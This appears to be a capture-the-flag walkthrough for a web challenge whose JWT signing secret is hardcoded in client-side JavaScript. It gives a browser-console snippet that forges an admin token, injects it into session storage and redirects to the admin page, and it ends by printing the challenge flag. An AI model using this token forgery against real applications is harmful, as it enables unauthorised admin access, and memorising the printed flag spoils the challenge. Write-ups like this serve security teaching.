# Vulnerability Exploit Guide: Client-Side JWT Weakness

## Overview
The application uses a **Client-Side** JWT implementation where the signing "secret" key is hardcoded in the JavaScript file. This allows any user to inspect the code, retrieve the secret, and forge a valid token with administrative privileges.

## Step-by-Step Exploitation

### 1. Identify the Session Mechanism
1.  Open the website in your browser.
2.  Open **Developer Tools** (F12 or Right Click -> Inspect).
3.  Go to the **Application** tab (or Storage tab in Firefox).
4.  Expand **Session Storage**.
5.  Observe the `session_token`. It is a JWT (JSON Web Token) containing three parts separated by dots (`.`).

### 2. Analyze the Source Code
1.  Go to the **Sources** (or Debugger) tab.
2.  Look for JavaScript files. You will find `js/auth.js`.
3.  Read the code. You will see a constant:
    ```javascript
    const SECRET_KEY = "s3cr3t_k3y_f0r_ctf_ch@ll3ng3";
    ```
4.  You will also see the `initSession` function creating a token with `admin: false`.

### 3. Forge the Admin Token
You need to create a token identical to the guest one, but with `admin: true`.
Since the signing functions (`sign`, `base64UrlEncode`) are available in the global scope, you can use the **Console** to generate a new token.

**Run this snippet in the Browser Console:**

```javascript
// 1. Define the admin payload
const header = base64UrlEncode(JSON.stringify({ alg: "HS256", typ: "JWT" }));
const payload = base64UrlEncode(JSON.stringify({ 
    sub: "guest", 
    name: "Guest User", 
    admin: true, // The magic change
    iat: Math.floor(Date.now() / 1000) 
}));

// 2. Sign it using the exposed SECRET_KEY
// Note: We use the 'sign' function from auth.js
sign(header, payload, "s3cr3t_k3y_f0r_ctf_ch@ll3ng3").then(signature => {
    const forgedToken = `${header}.${payload}.${signature}`;
    console.log("Forged Token:", forgedToken);
    
    // 3. Inject into Session Storage
    sessionStorage.setItem('session_token', forgedToken);
    
    // 4. Redirect to Admin Page
    console.log("Redirecting to admin...");
    window.location.href = "admin.html";
});
```

### 4. Access the Flag
After running the script, the page will navigate to `admin.html`. Since a valid token with `admin: true` is now in your session storage, you will see:

**Access Granted!**  
**`NFSUCTF{jW7_s1gn1n9_k3y_3xp0s3d}`**
